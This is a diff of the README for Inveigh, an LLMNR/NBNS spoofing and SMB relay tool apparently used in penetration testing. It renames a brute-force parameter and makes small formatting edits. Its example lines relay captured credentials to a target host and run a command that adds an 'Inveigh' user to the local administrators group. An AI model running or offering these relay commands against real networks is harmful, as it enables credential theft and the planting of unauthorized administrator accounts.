@@ -15,7 +15,7 @@ Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool design
 * To import with Import-Module:   
 	Import-Module ./Inveigh.psd1  
 
-* To import using dot source method:  
+* To import using the dot source method:  
 	. ./Inveigh.ps1  
 	. ./Inveigh-BruteForce.ps1  
 	. ./Inveigh-Relay.ps1  
@@ -169,8 +169,8 @@ Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool design
 * __NBNSTTL__ - Default = 165 Seconds: NBNS TTL in seconds for the response packet.  
 * __NBNSTypes__ - Default = 00,20: Comma separated list of NBNS types to spoof. Types include 00 = Workstation Service, 03 = Messenger Service, 20 = Server Service, 1B = Domain Name  
 * __NBNSBruteForce__ - Default = Disabled: (Y/N) Enable/Disable NBNS brute force spoofer.  
+* __NBNSBruteForceHost__ - Default = WPAD: Hostname for NBNS brute force spoofer.  
 * __NBNSBruteForcePause__ Default = Disabled: (Integer) Time in seconds the NBNS brute force spoofer will stop spoofing after an incoming HTTP request is received.   
-* __Hostname__ - Default = WPAD: Hostname for NBNS bruteforce spoofer.  
 * __HTTP__ - Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.  
 * __HTTPIP__ - Default = Any: IP address for the HTTP listener.  
 * __HTTPPort__ - Default = 80: TCP port for the HTTP listener.  
@@ -209,13 +209,13 @@ Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool design
 * Granular control of console and file output  
 
 ##### Examples:
-* To execute with basic options:
-	Invoke-Inveigh -HTTP N
-	Invoke-InveighRelay -SMBRelayTarget 192.168.1.50 -SMBRelayCommand "net user Inveigh Summer2016 /add && net localgroup administrators Inveigh /add"
+* To execute with basic options:  
+	Invoke-Inveigh -HTTP N  
+	Invoke-InveighRelay -SMBRelayTarget 192.168.1.50 -SMBRelayCommand "net user Inveigh Summer2016 /add && net localgroup administrators Inveigh /add"  
 	
-* To execute with and only perform SMB relay with the 'Administrator' account: 
-	Invoke-InveighUnprivileged -HTTP N
-	Invoke-InveighRelay -SMBRelayTarget 192.168.1.50 -SMBRelayCommand "net user Inveigh Summer2016 /add && net localgroup administrators Inveigh /add" -SMBRelayUsernames Administrator
+* To execute with and only perform SMB relay with the 'Administrator' account:  
+	Invoke-InveighUnprivileged -HTTP N  
+	Invoke-InveighRelay -SMBRelayTarget 192.168.1.50 -SMBRelayCommand "net user Inveigh Summer2016 /add && net localgroup administrators Inveigh /add" -SMBRelayUsernames Administrator  
 
 ##### Screenshot:
 ![inveigh-relay](https://cloud.githubusercontent.com/assets/5897462/18420526/9991a758-7842-11e6-90b2-9d519ff03c28.png)
